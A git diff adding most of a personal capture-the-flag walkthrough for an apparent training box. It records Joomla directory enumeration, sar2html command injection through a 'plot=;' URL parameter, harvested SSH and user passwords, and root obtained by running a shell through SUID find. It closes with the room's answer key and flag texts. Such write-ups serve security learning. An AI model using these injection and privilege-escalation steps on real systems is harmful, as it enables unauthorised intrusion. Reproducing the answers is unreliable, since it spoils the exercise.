@@ -276,3 +276,281 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /.htaccess            (Status: 403) [Size: 304]
 /administrator        (Status: 301) [Size: 329] [--> http://10.10.242.217/joomla/administrator/]
 /.htpasswd            (Status: 403) [Size: 304]
+/bin                  (Status: 301) [Size: 319] [--> http://10.10.242.217/joomla/bin/]
+/build                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/build/]
+/cache                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/cache/]
+/_files               (Status: 301) [Size: 322] [--> http://10.10.242.217/joomla/_files/]
+/components           (Status: 301) [Size: 326] [--> http://10.10.242.217/joomla/components/]
+/images               (Status: 301) [Size: 322] [--> http://10.10.242.217/joomla/images/]
+/includes             (Status: 301) [Size: 324] [--> http://10.10.242.217/joomla/includes/]
+/index.php            (Status: 200) [Size: 12484]
+/installation         (Status: 301) [Size: 328] [--> http://10.10.242.217/joomla/installation/]
+/language             (Status: 301) [Size: 324] [--> http://10.10.242.217/joomla/language/]
+/layouts              (Status: 301) [Size: 323] [--> http://10.10.242.217/joomla/layouts/]
+/libraries            (Status: 301) [Size: 325] [--> http://10.10.242.217/joomla/libraries/]
+/media                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/media/]
+/modules              (Status: 301) [Size: 323] [--> http://10.10.242.217/joomla/modules/]
+/plugins              (Status: 301) [Size: 323] [--> http://10.10.242.217/joomla/plugins/]
+/templates            (Status: 301) [Size: 325] [--> http://10.10.242.217/joomla/templates/]
+/tests                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/tests/]
+/tmp                  (Status: 301) [Size: 319] [--> http://10.10.242.217/joomla/tmp/]
+Progress: 4547 / 4615 (98.53%)===============================================================
+2023/02/03 16:31:51 Finished
+===============================================================
+
+http://10.10.242.217/joomla/administrator/index.php
+http://10.10.242.217/joomla/_files/
+```
+
+## Exploitation
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl -s http://10.10.242.217/joomla/_files/ | html2text
+                  ****** VjJodmNITnBaU0JrWVdsemVRbz0K ******
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo 'VjJodmNITnBaU0JrWVdsemVRbz0K' | base64 -d
+V2hvcHNpZSBkYWlzeQo=
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo 'V2hvcHNpZSBkYWlzeQo=' | base64 -d
+Whopsie daisy
+
+cyberchef
+VjJodmNITnBaU0JrWVdsemVRbz0K  Whopsie daisy
+
+http://10.10.242.217/joomla/tests/codeception/_data/
+
+Nothing
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl -s http://10.10.242.217/joomla/_database/ | html2text
+                      ****** Lwuv oguukpi ctqwpf. ******
+https://www.dcode.fr/rot-cipher
+Just messing around.
+https://quipqiup.com/
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl -s http://10.10.242.217/joomla/~www/ | html2text     
+                      ****** Mnope, nothin to see. ******
+
+http://10.10.242.217/joomla/_test/
+
+sar2html
+
+https://www.exploit-db.com/exploits/47204
+
+http://10.10.242.217/joomla/_test/index.php?plot=;whoami
+
+Select Host
+www-data
+
+http://10.10.242.217/joomla/_test/index.php?plot=;ls
+
+Select Host
+log.txt
+
+http://10.10.242.217/joomla/_test/index.php?plot=;cat%20log.txt
+
+inspect
+
+<select class="select_text" name="host" onchange="this.form.submit();"><option value="null" selected="">Select Host</option><option value="HPUX">HPUX</option><option value="Linux">Linux</option><option value="SunOS">SunOS</option><option value="Aug" 20="" 11:16:26="" parrot="" sshd[2443]:="" server="" listening="" on="" 0.0.0.0="" port="" 22.="">Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.</option><option value="Aug" 20="" 11:16:26="" parrot="" sshd[2443]:="" server="" listening="" on="" ::="" port="" 22.="">Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.</option><option value="Aug" 20="" 11:16:35="" parrot="" sshd[2451]:="" accepted="" password="" for="" basterd="" from="" 10.1.1.1="" port="" 49824="" ssh2="" #pass:="" superduperp@$$="">Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$</option>Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)<option value="Aug" 20="" 11:16:35="" parrot="" sshd[2451]:="" pam_unix(sshd:session):="" session="" opened="" for="" user="" pentest="" by="" (uid="0)"></option><option value="Aug" 20="" 11:16:36="" parrot="" sshd[2466]:="" received="" disconnect="" from="" 10.10.170.50="" port="" 49824:11:="" disconnected="" by="" user="">Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user</option><option value="Aug" 20="" 11:16:36="" parrot="" sshd[2466]:="" disconnected="" from="" user="" pentest="" 10.10.170.50="" port="" 49824="">Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 
+
+SSH
+
+basterd:superduperp@$$
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh basterd@10.10.242.217 -p 55007
+The authenticity of host '[10.10.242.217]:55007 ([10.10.242.217]:55007)' can't be established.
+ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.242.217]:55007' (ED25519) to the list of known hosts.
+basterd@10.10.242.217's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+8 packages can be updated.
+8 updates are security updates.
+
+Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
+```
+
+## Privilege Escalation
+```text
+$ whoami
+basterd
+
+basterd@Vulnerable:~$ cd /home
+basterd@Vulnerable:/home$ ls
+basterd  stoner
+basterd@Vulnerable:/home$ cd basterd
+basterd@Vulnerable:~$ ls
+backup.sh
+basterd@Vulnerable:~$ cat backup.sh
+REMOTE=1.2.3.4
+
+SOURCE=/home/stoner
+TARGET=/usr/local/backup
+
+LOG=/home/stoner/bck.log
+ 
+DATE=`date +%y\.%m\.%d\.`
+
+USER=stoner
+#superduperp@$$no1knows
+
+ssh $USER@$REMOTE mkdir $TARGET/$DATE
+
+if [ -d "$SOURCE" ]; then
+    for i in `ls $SOURCE | grep 'data'`;do
+	     echo "Begining copy of" $i  >> $LOG
+	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
+	     echo $i "completed" >> $LOG
+		
+		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
+		    rm $SOURCE/$i
+		    echo $i "removed" >> $LOG
+		    echo "####################" >> $LOG
+				else
+					echo "Copy not complete" >> $LOG
+					exit 0
+		fi 
+    done
+     
+
+else
+
+    echo "Directory is not present" >> $LOG
+    exit 0
+fi
+basterd@Vulnerable:~$ ls -lah
+total 16K
+drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 .
+drwxr-xr-x 4 root    root    4.0K Aug 22  2019 ..
+-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
+-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
+drwx------ 2 basterd basterd 4.0K Aug 22  2019 .cache
+basterd@Vulnerable:~$ cat .bash_history
+basterd@Vulnerable:~$ cat .cache
+cat: .cache: Is a directory
+basterd@Vulnerable:~$ cd .cache
+basterd@Vulnerable:~/.cache$ ls
+motd.legal-displayed
+basterd@Vulnerable:~/.cache$ ls -lah
+total 8.0K
+drwx------ 2 basterd basterd 4.0K Aug 22  2019 .
+drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 ..
+-rw-r--r-- 1 basterd basterd    0 Aug 22  2019 motd.legal-displayed
+basterd@Vulnerable:~/.cache$ cat motd.legal-displayed
+
+USER=stoner
+#superduperp@$$no1knows
+
+basterd@Vulnerable:~/.cache$ su stoner
+Password: superduperp@$$no1knows
+stoner@Vulnerable:/home/basterd/.cache$ cd /home/stoner
+stoner@Vulnerable:~$ ls
+stoner@Vulnerable:~$ ls -lah
+total 16K
+drwxr-x--- 3 stoner stoner 4.0K Aug 22  2019 .
+drwxr-xr-x 4 root   root   4.0K Aug 22  2019 ..
+drwxrwxr-x 2 stoner stoner 4.0K Aug 22  2019 .nano
+-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
+stoner@Vulnerable:~$ cat .secret
+You made it till here, well done.
+stoner@Vulnerable:~$ cat .nano
+cat: .nano: Is a directory
+stoner@Vulnerable:~$ cd .nano
+stoner@Vulnerable:~/.nano$ ls -lah
+total 8.0K
+drwxrwxr-x 2 stoner stoner 4.0K Aug 22  2019 .
+drwxr-x--- 3 stoner stoner 4.0K Aug 22  2019 ..
+
+stoner@Vulnerable:~/.nano$ sudo -l
+User stoner may run the following commands on Vulnerable:
+    (root) NOPASSWD: /NotThisTime/MessinWithYa
+
+stoner@Vulnerable:~/.nano$ find / -perm -4000 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root   root        30K Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root        34K May 15  2019 /bin/mount
+-rwsr-xr-x 1 root   root        39K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root   root        43K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root   root        38K Mar 26  2019 /bin/su
+-rwsr-xr-x 1 root   root        26K May 15  2019 /bin/umount
+-rwsr-sr-x 1 daemon daemon      50K Jan 15  2016 /usr/bin/at
+-rwsr-xr-x 1 root   root        73K Mar 26  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root        39K Mar 26  2019 /usr/bin/chsh
+-r-sr-xr-x 1 root   root       227K Feb  8  2016 /usr/bin/find
+-rwsr-xr-x 1 root   root        77K Mar 26  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root        36K Mar 26  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root        34K Mar 26  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root        36K Mar 26  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root        52K Mar 26  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root        18K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root       157K Jun 11  2019 /usr/bin/sudo
+-rwsr-xr-- 1 root   www-data    14K Apr  3  2019 /usr/lib/apache2/suexec-custom
+-rwsr-xr-- 1 root   www-data    14K Apr  3  2019 /usr/lib/apache2/suexec-pristine
+-rwsr-xr-- 1 root   messagebus  46K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root       5.4K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root       502K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+
+stoner@Vulnerable:~/.nano$ find . -exec /bin/sh -p \; -quit
+```
+```text
+# whoami
+root
+```
+```text
+# cd /root
+```
+```text
+# ls
+root.txt
+```
+```text
+# cat root.txt
+It wasn't that hard, was it?
+```
+![[Pasted image 20230203163820.png]]
+![[Pasted image 20230203164315.png]]
+File extension after anon login
+*txt*
+What is on the highest port?
+*ssh*
+What's running on port 10000?
+*Webmin*
+Can you exploit the service running on that port? (yay/nay answer)
+*nay*
+What's CMS can you access?
+*joomla*
+Keep enumerating, you'll know when you find it.
+List & read, don't reverse
+Completed
+The interesting file name in the folder?
+*log.txt*
+### Questions #2
+You can complete this with manual enumeration, but do it as you wish
+Answer the questions below
+Where was the other users pass stored(no extension, just the name)?
+*backup*
+user.txt
+*You made it till here, well done.*
+What did you exploit to get the privileged user?
+*find*
+root.txt
+*It wasn't that hard, was it?*
+
+## Notes / Lessons Learned
+[[GoldenEye]]
+
